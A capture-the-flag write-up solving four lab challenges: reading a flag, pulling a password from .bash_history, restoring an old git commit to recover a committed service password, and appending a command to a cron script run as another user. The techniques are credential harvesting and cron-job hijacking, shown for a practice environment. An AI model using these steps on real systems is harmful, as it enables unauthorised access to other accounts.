# Hostbusters

Note, I did not solve all of these, below are my solves for the first four challenges. I also figured out Old Habits, but that was after the competition ended and thus I will not include it in this writeup.

## Foothold on Charon

### Objective

access Charon and get the flag

### The Solve

```
cat flag.txt
```

Thus the flag is

```
deadface{f00th0ld_p4st_th3_v31l}
```

## Looking Back

### Objective

get the flag from a DEADFACE member's home directory

### The Solve

```
cat .bash_history
```

see where deephax changed their password:

```
echo "deephax:Sk4t3rB0y_S1nce_2011" | sudo chpasswd
```

use su to sign into deephax's account and put in the above password to access the flag in his home directory

```
cd /home/deephax
cat flag.txt
```

thus the flag is

```
deadface{sh3ll_h1st0ry_t3lls_4ll}
```

## Git Good

Use the tool in deephax's home directory to get the next user's flag

### The Solve

in deephax's home directory, notes.txt contains the following:

```
reminder: I committed the scraper service pw by accident and "removed" it
in the next commit. must scrub git history properly at some point.
```

The directory kingmaker-scraper is a git repository in deephax's home directory, so I can guess from this note that I need to restore a previous commit to find the next user

```
cd kingmaker-scraper
git log
```

see the initial commit 49df4e8cc7144cf619678fe57ce20ed95e3e4681 and restore to it

```
git restore --source=49df4e8cc7144cf619678fe57ce20ed95e3e4681 .
$ cat config.py 
# scraper service account
SERVICE_USER = "gh0st404"
SERVICE_PW = "Gh0stInTh3Sh3ll_404"

```

I switched to user gh0st404 with this password and read the flag in his home directory. Thus, the flag is:

```
cd ~
deadface{g1t_l0g_sp1lls_s3cr3ts}
```

## On Schedule

### Objective

edit a collector script that gh0st404 has access to that gets run on someone else's account

### The Solve

In gh0st404's home directory, there is a file called README.txt

```
$ cat README.txt 
gh0st404 // scrape ops
The nightly collector under /opt/scrape feeds sunstalker's analyst pipeline.
Targets this cycle: TGRI exec calendars, Cronin Group filings.
```

This tells me that the script is in /opt/scrape. I found the script collect.sh in that directory:

```
#!/bin/sh
# nightly collector ... maintained by gh0st404, RUN BY sunstalker via cron.
echo "[collect] $(date) scrape cycle ok" >> /tmp/collect.log
```

 Knowing that it gets run on another user's account, I added a line to open the flag and save it to /tmp/flag.txt.

```
echo "cat ~/flag.txt > /tmp/flag.txt" >> /opt/scrape/collect.sh
```

and waited for the script to get run. The flag showed up in /tmp/flag.txt on the minute, thus the flag is

```
deadface{cr0n_c4rr13d_my_p4yl04d}
```

